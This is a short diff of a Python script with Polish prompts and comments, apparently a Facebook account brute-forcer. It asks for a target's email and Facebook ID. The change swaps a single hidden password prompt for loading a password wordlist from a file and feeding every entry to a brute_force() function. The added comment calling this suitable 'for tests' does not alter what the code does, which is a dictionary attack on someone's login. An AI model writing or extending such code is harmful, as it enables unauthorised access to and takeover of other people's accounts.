@@ -24,10 +24,13 @@ def main():
     email = input('Podaj adres e-mail (jako nazwę użytkownika): ')
     fb_id = input('Podaj identyfikator Facebooka: ')
     
-    # Ukrywanie hasła podczas wprowadzania
-    password = getpass.getpass('Podaj hasło: ')
+    # Uwaga: To jest zalecane do testów. W prawdziwej sytuacji zaleca się odczyt hasła z bezpiecznego źródła.
+    password_file = input('Podaj nazwę pliku z hasłami: ')
+    
+    with open(password_file, 'r') as file:
+        passwords = [line.strip() for line in file]
 
-    brute_force(email, fb_id, [password])
+    brute_force(email, fb_id, passwords)
 
 if __name__ == '__main__':
     main()
